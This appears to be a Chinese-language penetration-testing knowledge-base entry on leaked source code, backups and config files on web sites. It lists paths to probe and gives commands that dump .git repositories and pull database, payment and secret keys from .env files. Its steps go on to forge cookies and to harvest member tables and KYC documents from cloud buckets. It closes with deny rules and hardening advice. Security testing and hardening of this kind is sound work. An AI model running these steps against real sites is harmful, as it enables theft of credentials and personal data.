---
title: 源码 / 备份 / 配置泄露
cve: 无（部署缺陷）
severity: high
cvss: 7.5
product: 通用 Web（PHP/Java/Node 自研站）
versions: 任意
ports: 80, 443, 8080
keywords: .git, .svn, env, backup, zip, sourcemap, swagger, 源码泄露
verified: false
sources: 公开资料整理（业务逻辑 / 实现 / 配置缺陷类，无 CVE；出处见文末参考）
---

## 指纹

按优先级扫这几类路径（这类站点命中率最高）：

```
备份:   /www.zip /web.zip /wwwroot.zip /backup.zip /bak.zip /1.zip /<域名>.zip
        /<域名>.tar.gz /db.sql /dump.sql /sql.zip /temp/ /backup/ /bak/
版本库: /.git/HEAD  /.git/config  /.svn/wc.db  /.hg/
配置:   /.env  /.env.bak  /config.php.bak  /config/config.php~  /.index.php.swp
        /application/database.php  /config/database.php  /web.config
文档:   /swagger-ui.html  /v2/api-docs  /doc.html  /composer.json  /package.json
前端:   /static/js/app.js.map  /assets/index-*.js.map  /config.js  /env.js
```

判定不能只看 200：`Content-Length`、`Content-Type`、首字节（`PK\x03\x04`=zip、`SQL dump`、`{`=JSON）一起看；`/.git/HEAD` 返回 `ref: refs/heads/master` 才算真命中。

## 前置条件

- 反代/CDN 没有统一拦截敏感后缀（很多只拦 `/admin`）。
- **要直连源站**：CDN 通常会把 `.git` 也缓存成 404，源站才是真相（源站定位见 `kb-triage/fingerprint-workflow.md` 与 CDN 段）。

## PoC

```bash
# 版本库
git-dumper http://target/.git/ ./src          # 或 GitHack
sqlite3 .svn/wc.db "select local_relpath from NODES limit 50"

# 配置
curl -s http://target/.env | grep -Ei 'DB_|REDIS|OSS|SMS|PAY|SECRET|APP_KEY'

# 备份（确认是 zip 再下）
curl -sI http://target/www.zip | grep -Ei 'content-type|content-length'

# 前端 sourcemap 还原
npx source-map-explorer app.js.map
```

## 利用步骤

1. 批量扫路径 → 命中后立刻取"能直接用的密钥"：DB 账号、Redis 口令、OSS AK/SK、短信服务 key、支付商户号与私钥、JWT secret。
2. `.git` dump 后审计路由与鉴权中间件，重点找"只在前端判断权限"的接口（配合 `api-idor-bola.md`）。
3. Laravel 的 `.env` 里 `APP_KEY` 泄露 → 可解密/伪造框架加密串与 Cookie。
4. 拿到 DB → 会员表/订单表/代理表/提现审核表；拿到 OSS AK → 遍历 bucket 里的 KYC 证件与对账单。
5. 这些是静态文件，没有落地物；但下载会在 access log 留痕（`GET /.git/HEAD` 这种），取证时把自己请求的时间标出来。

## 修复与缓解（加固）

- 反代统一 deny：`\.(git|svn|hg)(/|$)`、`\.(zip|tar\.gz|sql|bak|swp|old|save)$`、`\.env`、`\.map$`。
- 备份文件放 webroot 之外；CI/CD 不把 `.env`、`.git`、sourcemap 部署到生产。
- 定期做"部署残留"扫描（上面的路径表本身就是一份检查清单）。

## 参考

- OWASP WSTG-INFO-05（枚举 Web 服务器内容）；GitHack / git-dumper 项目文档。
